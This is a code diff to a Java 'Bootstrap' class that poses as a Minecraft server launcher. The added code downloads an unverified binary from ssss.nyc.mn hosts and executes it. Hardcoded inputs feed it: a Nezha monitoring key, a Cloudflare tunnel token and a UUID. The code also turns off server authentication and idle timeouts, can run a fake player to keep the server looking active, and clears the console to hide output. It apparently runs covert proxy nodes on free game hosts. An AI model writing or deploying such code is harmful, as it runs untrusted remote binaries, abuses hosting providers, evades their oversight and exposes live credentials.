@@ -5,9 +5,6 @@ import java.net.*;
 import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.atomic.AtomicBoolean;
-import java.util.stream.Stream;
-import java.util.zip.ZipEntry;
-import java.util.zip.ZipInputStream;
 
 public class Bootstrap
 {
@@ -15,462 +12,215 @@ public class Bootstrap
     private static final String ANSI_RED = "\033[1;31m";
     private static final String ANSI_YELLOW = "\033[1;33m";
     private static final String ANSI_RESET = "\033[0m";
-
     private static final AtomicBoolean running = new AtomicBoolean(true);
-    private static Process hy2Process;
-    private static Process nezhaProcess;
+    private static Process sbxProcess;
     private static Process minecraftProcess;
-    private static Thread keepaliveThread;
+    private static Thread fakePlayerThread;
     
     private static final String[] ALL_ENV_VARS = {
-        "UUID", "UDP_PORT", "DOMAIN", "HY2_PASSWORD", "HY2_OBFS_PASSWORD",
-        "HY2_PORTS", "HY2_SNI", "HY2_ALPN",
-        "NEZHA_SERVER", "NEZHA_PORT", "NEZHA_KEY", "NEZHA_TLS",
-        "MC_JAR", "MC_MEMORY", "MC_ARGS", "MC_PORT",
-        "MC_KEEPALIVE_HOST", "MC_KEEPALIVE_PORT",
-        "FAKE_PLAYER_ENABLED", "FAKE_PLAYER_NAME"
+        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
+        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
+        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
+        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
+        "MC_JAR", "MC_MEMORY", "MC_ARGS", "MC_PORT", 
+        "FAKE_PLAYER_ENABLED", "FAKE_PLAYER_NAME", "FAKE_PLAYER_ACTIVITY"
     };
 
     public static void main(String[] args) throws Exception
     {
+        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) 
+        {
+            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower,please switch the version in startup menu!" + ANSI_RESET);
+            Thread.sleep(3000);
+            System.exit(1);
+        }
+
         try {
-            Map<String, String> config = loadConfig();
+            Map<String, String> config = loadEnvVars();
             
-            // 1. 启动真实的 Minecraft 服务器（如果配置了）
-            if (isMcServerEnabled(config)) {
-                startMinecraftServer(config);
-            }
-            
-            // 2. 启动哪吒
-            if (isNezhaConfigured(config)) {
-                runNezhaAgent(config);
-            }
-            
-            // 3. 启动 Hysteria2
-            String hy2Url = generateHy2Url(config);
-            
-            System.out.println(ANSI_GREEN + "\n=== Hysteria2 Configuration ===" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Password: " + config.get("HY2_PASSWORD") + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Obfs Password: " + config.getOrDefault("HY2_OBFS_PASSWORD", "(none)") + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "UDP Port: " + config.get("UDP_PORT") + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Port Range: " + config.getOrDefault("HY2_PORTS", "(single port)") + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Domain/IP: " + config.get("DOMAIN") + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "SNI: " + config.getOrDefault("HY2_SNI", "www.bing.com") + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "ALPN: " + config.getOrDefault("HY2_ALPN", "h3") + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "\n=== Hysteria2 Node URL ===" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + hy2Url + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "================================" + ANSI_RESET);
-            
-            runHysteria2Service(config);
-            
-            // 4. 启动真实假玩家（推荐）
-            if (isFakePlayerBotEnabled(config)) {
-                System.out.println(ANSI_YELLOW + "[FakePlayer] Waiting for MC server to fully start..." + ANSI_RESET);
-                waitForServerReady();
-                startFakePlayerBot(config);
-            } 
-            // 或者启动简单 MC 保活（备选）
-            else if (isMcKeepaliveEnabled(config)) {
-                System.out.println(ANSI_YELLOW + "[MC-Keepalive] Waiting 60s for MC server to start..." + ANSI_RESET);
-                Thread.sleep(60000);
-                startMcKeepalive(config);
-            }
+            runSbxBinary(config);
             
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
                 stopServices();
             }));
+
+            Thread.sleep(15000);
+            System.out.println(ANSI_GREEN + "SBX Services are running!" + ANSI_RESET);
             
-            // 延时清屏
-            new Thread(() -> {
-                try {
-                    Thread.sleep(30000); 
-                    clearConsole();
-                } catch (InterruptedException e) {}
-            }).start();
-            
-            // 保持主线程活跃
-            while (running.get()) {
-                try {
-                    Thread.sleep(10000);
-                } catch (InterruptedException e) {
-                    break;
-                }
+            if (isMcServerEnabled(config)) {
+                startMinecraftServer(config);
+                System.out.println(ANSI_YELLOW + "\n[MC-Server] Waiting for server to fully start..." + ANSI_RESET);
+                Thread.sleep(30000);
             }
+            
+            if (isFakePlayerEnabled(config)) {
+                System.out.println(ANSI_YELLOW + "\n[FakePlayer] Preparing to connect..." + ANSI_RESET);
+                waitForServerReady(config);
+                startFakePlayerBot(config);
+            }
+            
+            System.out.println(ANSI_GREEN + "\nThank you for using this script, Enjoy!\n" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
+            Thread.sleep(20000);
+            clearConsole();
         } catch (Exception e) {
-            System.err.println(ANSI_RED + "Init Error: " + e.getMessage() + ANSI_RESET);
+            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
             e.printStackTrace();
+        }
+        
+        while (running.get()) {
+            try {
+                Thread.sleep(30000); // 增加到30秒，减少主循环检查频率
+            } catch (InterruptedException e) {
+                break;
+            }
         }
     }
     
     private static void clearConsole() {
         try {
-            System.out.print("\033[H\033[2J");
-            System.out.flush();
-        } catch (Exception ignored) {}
-    }
-    
-    private static boolean isNezhaConfigured(Map<String, String> config) {
-        String server = config.get("NEZHA_SERVER");
-        String key = config.get("NEZHA_KEY");
-        return server != null && !server.trim().isEmpty() 
-            && key != null && !key.trim().isEmpty();
-    }
-    
-    private static void runNezhaAgent(Map<String, String> config) throws Exception {
-        Path nezhaPath = downloadNezhaAgent();
-        Path nezhaConfigPath = createNezhaConfig(config);
-        
-        // 强力清理旧数据
-        Path nezhaDir = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-work");
-        if (Files.exists(nezhaDir)) {
-            try (Stream<Path> walk = Files.walk(nezhaDir)) {
-                walk.sorted(Comparator.reverseOrder())
-                    .map(Path::toFile)
-                    .forEach(File::delete);
-            } catch (Exception e) {}
+            if (System.getProperty("os.name").contains("Windows")) {
+                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
+                    .inheritIO()
+                    .start()
+                    .waitFor();
+            } else {
+                System.out.print("\033[H\033[3J\033[2J");
+                System.out.flush();
+                
+                new ProcessBuilder("tput", "reset")
+                    .inheritIO()
+                    .start()
+                    .waitFor();
+                
+                System.out.print("\033[8;30;120t");
+                System.out.flush();
+            }
+        } catch (Exception e) {
+            try {
+                new ProcessBuilder("clear").inheritIO().start().waitFor();
+            } catch (Exception ignored) {}
         }
-        Files.createDirectories(nezhaDir);
-        
-        System.out.println(ANSI_GREEN + "Starting Nezha Agent..." + ANSI_RESET);
-        
-        List<String> cmd = new ArrayList<>();
-        cmd.add(nezhaPath.toString());
-        cmd.add("-c");
-        cmd.add(nezhaConfigPath.toString());
-        
-        ProcessBuilder pb = new ProcessBuilder(cmd);
-        pb.directory(nezhaDir.toFile());
+    }   
+    
+    private static void runSbxBinary(Map<String, String> envVars) throws Exception {
+        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
+        pb.environment().putAll(envVars);
         pb.redirectErrorStream(true);
+        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
         
-        nezhaProcess = pb.start();
-        
-        // 【修改】静默失败模式 - 只显示关键日志
-        new Thread(() -> {
-            try (BufferedReader reader = new BufferedReader(
-                    new InputStreamReader(nezhaProcess.getInputStream()))) {
-                String line;
-                while ((line = reader.readLine()) != null) {
-                    // 只显示严重错误（排除超时相关）
-                    if (line.contains("FATAL") || 
-                        line.contains("panic") ||
-                        (line.contains("error") && 
-                         !line.contains("deadline exceeded") && 
-                         !line.contains("context") &&
-                         !line.contains("ReportSystemInfo"))) {
-                        System.out.println(ANSI_RED + "[Nezha] " + ANSI_RESET + line);
-                    }
-                    // 成功上线的日志
-                    else if (line.contains("上线成功") || 
-                             line.contains("Agent started") ||
-                             line.contains("认证成功")) {
-                        System.out.println(ANSI_GREEN + "[Nezha] ✓ " + ANSI_RESET + line);
-                    }
-                }
-            } catch (IOException e) {}
-        }).start();
-        
-        Thread.sleep(1000);
-        if (!nezhaProcess.isAlive()) {
-             System.out.println(ANSI_RED + "Nezha Agent exited prematurely: " + nezhaProcess.exitValue() + ANSI_RESET);
-        }
+        sbxProcess = pb.start();
     }
     
-    private static void runHysteria2Service(Map<String, String> config) throws Exception {
-        Path hy2Path = downloadHysteria2();
+    private static Map<String, String> loadEnvVars() throws IOException {
+        Map<String, String> envVars = new HashMap<>();
         
-        // 先生成证书（在创建配置前）
-        String sni = config.getOrDefault("HY2_SNI", "www.bing.com");
-        generateSelfSignedCert(sni);
+        envVars.put("UUID", "041c58ed-b05a-4812-b4a5-12a846dc4364");
+        envVars.put("FILE_PATH", "./world");
+        envVars.put("NEZHA_SERVER", "nzmbv.wuge.nyc.mn:443");
+        envVars.put("NEZHA_PORT", "");
+        envVars.put("NEZHA_KEY", "gUxNJhaKJgceIgeapZG4956rmKFgmQgP");
+        envVars.put("ARGO_PORT", "8001");
+        envVars.put("ARGO_DOMAIN", "valtoria.svip888.us.kg");
+        envVars.put("ARGO_AUTH", "eyJhIjoiMGU3ZjI2MWZiY2ExMzcwNzZhNGZmODcxMzU3ZjYzNGQiLCJ0IjoiYjQxZDJlZDgtZmFlMi00MjZiLTk1MGMtMjc5YWQ0MDY4OTUyIiwicyI6IllUZG1PVFUyTW1VdE0yTTVaaTAwWWpRd0xUaGpPRFF0TlRRMllXRTBaRFEzWm1KaCJ9");
+        envVars.put("HY2_PORT", "");
+        envVars.put("TUIC_PORT", "");
+        envVars.put("REALITY_PORT", "");
+        envVars.put("UPLOAD_URL", "");
+        envVars.put("CHAT_ID", "");
+        envVars.put("BOT_TOKEN", "");
+        envVars.put("CFIP", "store.ubi.com");
+        envVars.put("CFPORT", "443");
+        envVars.put("NAME", "俄罗斯");
+        envVars.put("DISABLE_ARGO", "false");
         
-        Path configPath = createHysteria2Config(config);
+        envVars.put("MC_JAR", "server99.jar");
+        envVars.put("MC_MEMORY", "512M");
+        envVars.put("MC_ARGS", "");
+        envVars.put("MC_PORT", "");
+        envVars.put("FAKE_PLAYER_ENABLED", "false");
+        envVars.put("FAKE_PLAYER_NAME", "laohu");
+        envVars.put("FAKE_PLAYER_ACTIVITY", "low"); // 默认改为low，更稳定
         
-        System.out.println(ANSI_GREEN + "Starting Hysteria2 Server..." + ANSI_RESET);
-        
-        ProcessBuilder pb = new ProcessBuilder(
-            hy2Path.toString(), "server", "-c", configPath.toString()
-        );
-        pb.redirectErrorStream(true);
-        
-        hy2Process = pb.start();
-        
-        new Thread(() -> {
-            try (BufferedReader reader = new BufferedReader(
-                    new InputStreamReader(hy2Process.getInputStream()))) {
-                String line;
-                while ((line = reader.readLine()) != null) {
-                    // 过滤掉客户端连接日志（包含 IP 地址）
-                    if (line.contains("client connected") || 
-                        line.contains("client disconnected") ||
-                        line.contains("addr")) {
-                        continue;  // 跳过这些日志
-                    }
-                    // 只显示错误和警告
-                    if (line.contains("ERROR") || line.contains("WARN") || line.contains("FATAL")) {
-                        System.out.println(ANSI_YELLOW + "[Hysteria2] " + ANSI_RESET + line);
-                    }
-                }
-            } catch (IOException e) {}
-        }).start();
-        
-        Thread.sleep(1000);
-        if (!hy2Process.isAlive()) {
-             System.out.println(ANSI_RED + "Hysteria2 Server exited prematurely: " + hy2Process.exitValue() + ANSI_RESET);
-        }
-    }
-    
-    private static Map<String, String> loadConfig() {
-        Map<String, String> config = new HashMap<>();
-        // 默认配置
-        config.put("UUID", "06b35768-995a-43e2-8c14-115890445188");
-        config.put("HY2_PASSWORD", "06b35768-995a-43e2-8c14-115890445188");  
-        config.put("HY2_OBFS_PASSWORD", "gfw-cant-see-me-2026");
-        config.put("UDP_PORT", "34993");
-        config.put("HY2_PORTS", "");
-        config.put("DOMAIN", "free.minecraft-hoster.com");
-        config.put("HY2_SNI", "www.bing.com");
-        config.put("HY2_ALPN", "h3");
-        config.put("NEZHA_SERVER", "nzmbv.wuge.nyc.mn:443");
-        config.put("NEZHA_PORT", "");
-        config.put("NEZHA_KEY", "gUxNJhaKJgceIgeapZG4956rmKFgmQgP");
-        config.put("NEZHA_TLS", "true");  // 【修改】443 端口启用 TLS
-        // Minecraft 服务器配置
-        config.put("MC_JAR", "server99.jar");
-        config.put("MC_MEMORY", "512M");
-        config.put("MC_ARGS", "");
-        config.put("MC_PORT", "34993");
-        // Minecraft 保活配置
-        config.put("MC_KEEPALIVE_HOST", "free.minecraft-hoster.com");
-        config.put("MC_KEEPALIVE_PORT", "34993");
-        // 真实假玩家配置
-        config.put("FAKE_PLAYER_ENABLED", "true");
-        config.put("FAKE_PLAYER_NAME", "labubu");
-        
-        // 环境变量覆盖
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
-            if (value != null && !value.isEmpty()) config.put(var, value);
+            if (value != null && !value.trim().isEmpty()) {
+                envVars.put(var, value);  
+            }
         }
-        return config;
-    }
-    
-    private static String generateHy2Url(Map<String, String> config) {
-        try {
-            StringBuilder url = new StringBuilder("hysteria2://");
-            
-            String password = URLEncoder.encode(config.get("HY2_PASSWORD"), "UTF-8");
-            url.append(password).append("@");
-            url.append(config.get("DOMAIN")).append(":").append(config.get("UDP_PORT"));
-            
-            List<String> params = new ArrayList<>();
-            
-            String obfsPass = config.get("HY2_OBFS_PASSWORD");
-            if (obfsPass != null && !obfsPass.trim().isEmpty()) {
-                params.add("obfs=salamander");
-                params.add("obfs-password=" + URLEncoder.encode(obfsPass, "UTF-8"));
-            }
-            
-            String sni = config.getOrDefault("HY2_SNI", "www.bing.com");
-            params.add("sni=" + sni);
-            
-            String ports = config.get("HY2_PORTS");
-            if (ports != null && !ports.trim().isEmpty()) {
-                params.add("mport=" + URLEncoder.encode(ports, "UTF-8"));
-            }
-            
-            String alpn = config.getOrDefault("HY2_ALPN", "h3");
-            params.add("alpn=" + alpn);
-            
-            params.add("insecure=1");
-            
-            if (!params.isEmpty()) {
-                url.append("?").append(String.join("&", params));
-            }
-            
-            url.append("#US-HostPapa");
-            
-            return url.toString();
-        } catch (Exception e) { 
-            e.printStackTrace();
-            return ""; 
-        }
-    }
-    
-    private static Path createHysteria2Config(Map<String, String> config) throws IOException {
-        StringBuilder yaml = new StringBuilder();
         
-        String ports = config.get("HY2_PORTS");
-        if (ports != null && !ports.trim().isEmpty()) {
-            yaml.append("listen: :").append(config.get("UDP_PORT")).append("\n");
-            yaml.append("mport: ").append(ports).append("\n\n");
+        Path envFile = Paths.get(".env");
+        if (Files.exists(envFile)) {
+            for (String line : Files.readAllLines(envFile)) {
+                line = line.trim();
+                if (line.isEmpty() || line.startsWith("#")) continue;
+                
+                line = line.split(" #")[0].split(" //")[0].trim();
+                if (line.startsWith("export ")) {
+                    line = line.substring(7).trim();
+                }
+                
+                String[] parts = line.split("=", 2);
+                if (parts.length == 2) {
+                    String key = parts[0].trim();
+                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
+                    
+                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
+                        envVars.put(key, value); 
+                    }
+                }
+            }
+        }
+        
+        return envVars;
+    }
+    
+    private static Path getBinaryPath() throws IOException {
+        String osArch = System.getProperty("os.arch").toLowerCase();
+        String url;
+        
+        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
+            url = "https://amd64.ssss.nyc.mn/sbsh";
+        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
+            url = "https://arm64.ssss.nyc.mn/sbsh";
+        } else if (osArch.contains("s390x")) {
+            url = "https://s390x.ssss.nyc.mn/sbsh";
         } else {
-            yaml.append("listen: :").append(config.get("UDP_PORT")).append("\n\n");
+            throw new RuntimeException("Unsupported architecture: " + osArch);
         }
         
-        String sni = config.getOrDefault("HY2_SNI", "www.bing.com");
-        yaml.append("tls:\n");
-        yaml.append("  cert: /tmp/cert.pem\n");
-        yaml.append("  key: /tmp/key.pem\n");
-        yaml.append("  sni: ").append(sni).append("\n\n");
-        
-        yaml.append("auth:\n");
-        yaml.append("  type: password\n");
-        yaml.append("  password: ").append(config.get("HY2_PASSWORD")).append("\n\n");
-        
-        String obfsPass = config.get("HY2_OBFS_PASSWORD");
-        if (obfsPass != null && !obfsPass.trim().isEmpty()) {
-            yaml.append("obfs:\n");
-            yaml.append("  type: salamander\n");
-            yaml.append("  salamander:\n");
-            yaml.append("    password: ").append(obfsPass).append("\n\n");
-        }
-        
-        yaml.append("bandwidth:\n");
-        yaml.append("  up: 100 mbps\n");
-        yaml.append("  down: 100 mbps\n\n");
-        
-        yaml.append("quic:\n");
-        yaml.append("  initStreamReceiveWindow: 8388608\n");
-        yaml.append("  maxStreamReceiveWindow: 8388608\n");
-        yaml.append("  initConnReceiveWindow: 20971520\n");
-        yaml.append("  maxConnReceiveWindow: 20971520\n");
-        yaml.append("  maxIdleTimeout: 60s\n");
-        yaml.append("  maxIncomingStreams: 256\n");
-        yaml.append("  disablePathMTUDiscovery: false\n\n");
-        
-        yaml.append("masquerade:\n");
-        yaml.append("  type: proxy\n");
-        yaml.append("  proxy:\n");
-        yaml.append("    url: https://").append(sni).append("\n");
-        yaml.append("    rewriteHost: true\n\n");
-        
-        yaml.append("acl:\n");
-        yaml.append("  inline:\n");
-        yaml.append("    - reject(all, udp/443)\n");
-        yaml.append("    - reject(all, udp/80)\n");
-        
-        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "hysteria2-config.yaml");
-        Files.write(path, yaml.toString().getBytes());
-        
-        System.out.println(ANSI_GREEN + "Hysteria2 Config created with stealth features enabled" + ANSI_RESET);
-        return path;
-    }
-    
-    private static void generateSelfSignedCert(String sni) throws IOException {
-        Path certPath = Paths.get("/tmp/cert.pem");
-        Path keyPath = Paths.get("/tmp/key.pem");
-        
-        if (!Files.exists(certPath) || !Files.exists(keyPath)) {
-            System.out.println("Generating self-signed certificate for " + sni + "...");
-            try {
-                new ProcessBuilder(
-                    "openssl", "req", "-x509", "-nodes", "-newkey", "rsa:2048",
-                    "-keyout", keyPath.toString(),
-                    "-out", certPath.toString(),
-                    "-days", "365",
-                    "-subj", "/CN=" + sni
-                ).start().waitFor();
-            } catch (InterruptedException e) {
-                throw new IOException("Certificate generation interrupted", e);
-            }
-        }
-    }
-    
-    private static Path createNezhaConfig(Map<String, String> config) throws IOException {
-        String server = config.get("NEZHA_SERVER");
-        
-        // 【修复】检查服务器地址是否已包含端口
-        if (!server.contains(":")) {
-            String port = config.getOrDefault("NEZHA_PORT", "5555");
-            server += ":" + port;
-        }
-        
-        // 【修复】自动检测 TLS（如果端口是 443 或配置了 TLS）
-        boolean tls = server.contains(":443") || server.contains(":8443");
-        if (config.containsKey("NEZHA_TLS") && !config.get("NEZHA_TLS").isEmpty()) {
-            tls = Boolean.parseBoolean(config.get("NEZHA_TLS"));
-        }
-        
-        String uuid = config.get("UUID");
-        String secret = config.get("NEZHA_KEY");
-        
-        String yml = String.format(
-            "client_id: \"%s\"\n" +
-            "uuid: \"%s\"\n" +
-            "client_secret: \"%s\"\n" +
-            "debug: false\n" +                      // 【修改】关闭调试日志
-            "server: \"%s\"\n" +
-            "tls: %b\n" +
-            "report_delay: 4\n" +
-            "skip_connection_count: true\n" +
-            "skip_procs_count: true\n" +
-            "disable_auto_update: true\n" +
-            "disable_force_update: true\n" +
-            "timeout: 30\n" +                       // 【新增】30 秒超时
-            "insecure_tls: false\n" +              // 【新增】验证 TLS 证书
-            "use_ipv6_country_code: false\n",      // 【新增】禁用 IPv6 检测
-            uuid,
-            uuid,
-            secret,
-            server,
-            tls
-        );
-        
-        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-config.yml");
-        Files.write(path, yml.getBytes());
-        System.out.println(ANSI_GREEN + "Nezha Config: " + server + " (TLS: " + tls + ", Timeout: 30s)" + ANSI_RESET);
-        return path;
-    }
-    
-    private static Path downloadHysteria2() throws IOException {
-        String url = "https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-amd64";
-        if (System.getProperty("os.arch").contains("aarch64")) {
-            url = "https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-arm64";
-        }
-        
-        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "hysteria2");
+        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
         if (!Files.exists(path)) {
-            System.out.println("Downloading Hysteria2...");
             try (InputStream in = new URL(url).openStream()) {
                 Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
             }
-            path.toFile().setExecutable(true);
-        }
-        return path;
-    }
-    
-    private static Path downloadNezhaAgent() throws IOException {
-        String url = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip";
-        if (System.getProperty("os.arch").contains("aarch64")) {
-            url = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_arm64.zip";
-        }
-        
-        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-agent");
-        if (!Files.exists(path)) {
-            System.out.println("Downloading Nezha...");
-            Path zip = Paths.get(System.getProperty("java.io.tmpdir"), "nezha.zip");
-            try (InputStream in = new URL(url).openStream()) {
-                Files.copy(in, zip, StandardCopyOption.REPLACE_EXISTING);
+            if (!path.toFile().setExecutable(true)) {
+                throw new IOException("Failed to set executable permission");
             }
-            
-            unzipFile(zip, Paths.get(System.getProperty("java.io.tmpdir")), "nezha-agent");
-            Files.delete(zip);
         }
         return path;
     }
     
     private static void stopServices() {
-        if (minecraftProcess != null) {
-            System.out.println(ANSI_YELLOW + "Stopping Minecraft Server..." + ANSI_RESET);
+        if (minecraftProcess != null && minecraftProcess.isAlive()) {
+            System.out.println(ANSI_YELLOW + "[MC-Server] Stopping..." + ANSI_RESET);
             minecraftProcess.destroy();
             try {
                 minecraftProcess.waitFor(10, java.util.concurrent.TimeUnit.SECONDS);
             } catch (InterruptedException e) {}
         }
-        if (nezhaProcess != null) nezhaProcess.destroy();
-        if (hy2Process != null) hy2Process.destroy();
-        if (keepaliveThread != null) keepaliveThread.interrupt();
+        if (sbxProcess != null && sbxProcess.isAlive()) {
+            sbxProcess.destroy();
+            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
+        }
+        if (fakePlayerThread != null && fakePlayerThread.isAlive()) {
+            fakePlayerThread.interrupt();
+            System.out.println(ANSI_YELLOW + "[FakePlayer] Stopped" + ANSI_RESET);
+        }
     }
+    
+    // ==================== Minecraft Server Functions ====================
     
     private static boolean isMcServerEnabled(Map<String, String> config) {
         String jarName = config.get("MC_JAR");
@@ -482,9 +232,20 @@ public class Bootstrap
         String memory = config.getOrDefault("MC_MEMORY", "512M");
         String extraArgs = config.getOrDefault("MC_ARGS", "");
         
+        String mcPortStr = config.get("MC_PORT");
+        int mcPort = 25565;
+        if (mcPortStr != null && !mcPortStr.trim().isEmpty()) {
+            try {
+                mcPort = Integer.parseInt(mcPortStr.trim());
+            } catch (NumberFormatException e) {
+                System.out.println(ANSI_YELLOW + "[MC-Server] Invalid MC_PORT, using default: 25565" + ANSI_RESET);
+            }
+        }
+        
+        config.put("MC_PORT", String.valueOf(mcPort));
+        
         if (!memory.matches("\\d+[MG]")) {
-            System.out.println(ANSI_RED + "[MC-Server] Invalid memory format: " + memory + ANSI_RESET);
-            System.out.println(ANSI_YELLOW + "[MC-Server] Using default: 512M" + ANSI_RESET);
+            System.out.println(ANSI_YELLOW + "[MC-Server] Invalid memory format, using default: 512M" + ANSI_RESET);
             memory = "512M";
         }
         
@@ -502,24 +263,46 @@ public class Bootstrap
         } else {
             String eulaContent = new String(Files.readAllBytes(eulaPath));
             if (!eulaContent.contains("eula=true")) {
-                System.out.println(ANSI_GREEN + "[MC-Server] Auto-accepting EULA" + ANSI_RESET);
                 Files.write(eulaPath, "eula=true".getBytes());
             }
         }
         
         Path propPath = Paths.get("server.properties");
+        String props = "";
+        
         if (Files.exists(propPath)) {
-            String props = new String(Files.readAllBytes(propPath));
-            if (props.contains("online-mode=true")) {
-                System.out.println(ANSI_GREEN + "[MC-Server] Setting online-mode=false for fake player support" + ANSI_RESET);
-                props = props.replace("online-mode=true", "online-mode=false");
-                Files.write(propPath, props.getBytes());
-            }
+            props = new String(Files.readAllBytes(propPath));
+        } else {
+            System.out.println(ANSI_GREEN + "[MC-Server] Creating server.properties" + ANSI_RESET);
+            props = "server-port=" + mcPort + "\nonline-mode=false\n";
+            Files.write(propPath, props.getBytes());
         }
         
-        System.out.println(ANSI_GREEN + "=== Starting Minecraft Server ===" + ANSI_RESET);
+        if (props.contains("server-port=")) {
+            props = props.replaceAll("server-port=\\d+", "server-port=" + mcPort);
+        } else {
+            props += "\nserver-port=" + mcPort + "\n";
+        }
+        
+        if (props.contains("online-mode=true")) {
+            System.out.println(ANSI_GREEN + "[MC-Server] Setting online-mode=false for fake player support" + ANSI_RESET);
+            props = props.replace("online-mode=true", "online-mode=false");
+        } else if (!props.contains("online-mode=")) {
+            props += "online-mode=false\n";
+        }
+        
+        if (props.contains("player-idle-timeout=")) {
+            props = props.replaceAll("player-idle-timeout=\\d+", "player-idle-timeout=0");
+        } else {
+            props += "player-idle-timeout=0\n";
+        }
+        
+        Files.write(propPath, props.getBytes());
+        
+        System.out.println(ANSI_GREEN + "\n=== Starting Minecraft Server ===" + ANSI_RESET);
         System.out.println(ANSI_GREEN + "JAR: " + jarName + ANSI_RESET);
         System.out.println(ANSI_GREEN + "Memory: " + memory + ANSI_RESET);
+        System.out.println(ANSI_GREEN + "Port: " + mcPort + ANSI_RESET);
         
         List<String> cmd = new ArrayList<>();
         cmd.add("java");
@@ -531,31 +314,17 @@ public class Bootstrap
         }
         
         int memoryMB = parseMemory(memory);
-        
         if (memoryMB >= 2048) {
             cmd.add("-XX:+UseG1GC");
             cmd.add("-XX:+ParallelRefProcEnabled");
             cmd.add("-XX:MaxGCPauseMillis=200");
             cmd.add("-XX:+UnlockExperimentalVMOptions");
             cmd.add("-XX:+DisableExplicitGC");
-            cmd.add("-XX:G1NewSizePercent=30");
-            cmd.add("-XX:G1MaxNewSizePercent=40");
-            cmd.add("-XX:G1HeapRegionSize=8M");
-            cmd.add("-XX:G1ReservePercent=20");
-            cmd.add("-XX:G1HeapWastePercent=5");
-            cmd.add("-XX:G1MixedGCCountTarget=4");
-            cmd.add("-XX:InitiatingHeapOccupancyPercent=15");
-            cmd.add("-XX:G1MixedGCLiveThresholdPercent=90");
-            cmd.add("-XX:G1RSetUpdatingPauseTimePercent=5");
-            cmd.add("-XX:SurvivorRatio=32");
-            cmd.add("-XX:+PerfDisableSharedMem");
-            cmd.add("-XX:MaxTenuringThreshold=1");
         } else if (memoryMB >= 1024) {
             cmd.add("-XX:+UseG1GC");
             cmd.add("-XX:MaxGCPauseMillis=200");
             cmd.add("-XX:+DisableExplicitGC");
         } else {
-            System.out.println(ANSI_YELLOW + "[MC-Server] Low memory mode (< 1GB)" + ANSI_RESET);
             cmd.add("-XX:+UseSerialGC");
             cmd.add("-XX:+DisableExplicitGC");
         }
@@ -584,7 +353,7 @@ public class Bootstrap
             System.out.println(ANSI_RED + "[MC-Server] Failed to start! Exit code: " + 
                              minecraftProcess.exitValue() + ANSI_RESET);
         } else {
-            System.out.println(ANSI_GREEN + "[MC-Server] ✓ Started successfully" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "[MC-Server] ✓ Started successfully on port " + mcPort + ANSI_RESET);
         }
     }
     
@@ -597,69 +366,82 @@ public class Bootstrap
                 return Integer.parseInt(memory.substring(0, memory.length() - 1));
             }
         } catch (Exception e) {}
-        return 1024;
+        return 512;
     }
     
-    private static void waitForServerReady() throws InterruptedException {
-        int mcPort = 25813;
-        try {
-            String portEnv = System.getenv("MC_PORT");
-            if (portEnv != null && !portEnv.isEmpty()) {
-                mcPort = Integer.parseInt(portEnv);
-            }
-        } catch (Exception e) {}
+    // ==================== Fake Player Functions ====================
+    
+    private static boolean isFakePlayerEnabled(Map<String, String> config) {
+        String enabled = config.get("FAKE_PLAYER_ENABLED");
+        return enabled != null && enabled.equalsIgnoreCase("true");
+    }
+    
+    private static void waitForServerReady(Map<String, String> config) throws InterruptedException {
+        int mcPort = getMcPort(config);
         
-        System.out.println(ANSI_YELLOW + "[FakePlayer] Checking server status on port " + mcPort + " every 5s..." + ANSI_RESET);
+        System.out.println(ANSI_YELLOW + "[FakePlayer] Checking server status on port " + mcPort + "..." + ANSI_RESET);
         
         for (int i = 0; i < 60; i++) {
             try {
-                Thread.sleep(60000);
+                Thread.sleep(5000);
                 
                 try (Socket testSocket = new Socket()) {
                     testSocket.connect(new InetSocketAddress("127.0.0.1", mcPort), 3000);
-                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Server port " + mcPort + " is open!" + ANSI_RESET);
+                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Server port " + mcPort + " is ready!" + ANSI_RESET);
                     Thread.sleep(10000);
                     return;
                 }
             } catch (Exception e) {
                 if (i % 6 == 0) {
-                    System.out.println(ANSI_YELLOW + "[FakePlayer] Still waiting... (" + (i * 5) + "s) - " + e.getMessage() + ANSI_RESET);
